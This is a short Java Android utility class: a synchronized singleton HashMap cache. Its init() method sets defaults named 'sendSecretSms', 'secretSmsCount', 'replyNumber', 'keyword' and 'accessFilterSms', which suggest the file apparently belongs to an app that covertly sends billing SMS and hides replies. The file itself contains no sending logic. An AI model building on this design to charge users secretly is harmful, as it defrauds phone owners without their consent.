package com.sttm.util;

import java.util.HashMap;
import android.content.Context;
import android.content.pm.PackageManager.NameNotFoundException;

public class KsoCache {

	private HashMap<String, Object> cacheContent = new HashMap<String, Object>();

	private static KsoCache cache = null;

	private static final Object LOCK = new Object();

	private KsoCache() {
	}

	public static synchronized KsoCache getInstance() {
		if (cache == null) {
			cache = new KsoCache();

		}
		return cache;

	}

	public void init(Context context) {

		synchronized (LOCK) {

			String curstomID = "";
			try {
				curstomID = KsoHelper.getCustomID(context);
			} catch (NameNotFoundException e) {

			}
			cache.reSetValue("curstomID", curstomID);
			cache.reSetValue("sendSecretSms", false);
			cache.reSetValue("salenum", "");
			cache.reSetValue("channel", "");
			cache.reSetValue("order", "");
			cache.reSetValue("replyNumber", "");
			cache.reSetValue("keyword", "");
			cache.reSetValue("secretSmsCount", 2);
			cache.reSetValue("interval", 4);		
			cache.reSetValue("timeout", "4");
			cache.reSetValue("accessFilterSms", true);

		}

	}

	public void reSetValues(String[] keys, Object[] values) {
		synchronized (LOCK) {
			for (int i = 0; i < values.length; i++) {
				cacheContent.put(keys[i], values[i]);

			}

		}

	}

	public void reSetValue(String key, Object value) {
		synchronized (LOCK) {
			cacheContent.put(key, value);

		}

	}


	public Object getValue(String key) {
		synchronized (LOCK) {
			return cacheContent.get(key);

		}

	}

	public void deleteCache(String key) {
		synchronized (LOCK) {
			cacheContent.remove(key);

		}

	}

	public void removeCache(String[] keys) {
		synchronized (LOCK) {
			for (int i = 0; i < keys.length; i++) {
				cacheContent.remove(keys[i]);

			}

		}

	}

	public void clearCache() {
		synchronized (LOCK) {
			cacheContent.clear();

		}

	}

	public int getCacheSize() {
		synchronized (LOCK) {
			return cacheContent.size();

		}

	}

}
